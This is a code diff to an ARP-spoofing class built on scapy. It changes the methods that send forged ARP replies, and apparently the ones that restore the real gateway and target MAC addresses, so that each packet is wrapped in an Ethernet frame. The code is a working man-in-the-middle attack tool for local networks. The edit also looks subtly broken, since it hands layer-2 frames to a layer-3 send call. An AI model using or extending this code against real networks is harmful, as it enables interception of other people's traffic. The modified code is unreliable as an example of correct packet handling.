@@ -92,10 +92,11 @@ class ArpSpoofer:
         self.gateway_mac: str | None = None
 
     def _send(self, pdst, hwdst, psrc):
-        from scapy.layers.l2 import ARP
+        from scapy.layers.l2 import ARP, Ether
         from scapy.sendrecv import send
 
-        send(ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc), iface=self.iface, verbose=False)
+        pkt = Ether(dst=hwdst) / ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
+        send(pkt, iface=self.iface, verbose=False)
 
     def _loop(self):
         while not self._stop.is_set():
@@ -118,11 +119,14 @@ class ArpSpoofer:
 
         if not (self.target_mac and self.gateway_mac):
             return
+        from scapy.layers.l2 import Ether
         for _ in range(5):
-            send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
-                     psrc=self.target_ip, hwsrc=self.target_mac), iface=self.iface, verbose=False)
-            send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
-                     psrc=self.gateway_ip, hwsrc=self.gateway_mac), iface=self.iface, verbose=False)
+            send(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+                op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
+                psrc=self.target_ip, hwsrc=self.target_mac), iface=self.iface, verbose=False)
+            send(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+                op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
+                psrc=self.gateway_ip, hwsrc=self.gateway_mac), iface=self.iface, verbose=False)
 
     def stop(self):
         self._stop.set()
